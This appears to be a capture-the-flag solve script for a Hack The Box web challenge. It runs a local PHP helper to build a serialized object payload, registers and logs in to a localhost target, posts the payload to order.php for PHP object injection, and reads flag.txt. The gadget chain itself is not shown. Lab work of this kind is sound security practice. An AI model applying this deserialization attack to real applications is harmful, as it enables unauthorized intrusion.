import requests
import subprocess

# Function to invoke the PHP script
def run_php_script():
    # Command to run the PHP script
    php_command = ['php', '/home/kali/Workspace_Ethical_Hacking/hack_the_box/htb_challenges/web/POP Restaurant WIP/utils.php']
    
    try:
        # Execute the PHP script
        result = subprocess.run(php_command, capture_output=True, text=True, check=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error executing PHP script: {e}")
        return None


if __name__ == "__main__":

    ip_dest = 'http://localhost:80'
    # Run the PHP script and get the serialized output
    serialized_data = run_php_script()
    
    if serialized_data:
        print("Serialized Data from PHP Script:")
        print(serialized_data)


    #register and login
    session = requests.Session()
    data={'username':'username', 'password':'password'}
    session.post(ip_dest+'/register.php', data=data)
    session.post(ip_dest+'/login.php', data=data)

    #send payload
    session.post(ip_dest+'/order.php', data=serialized_data)

    #get the flag
    flag = session.get(ip_dest+'/flag.txt')
    print("Congratulations, here's your flag: \n")
    print(flag.text)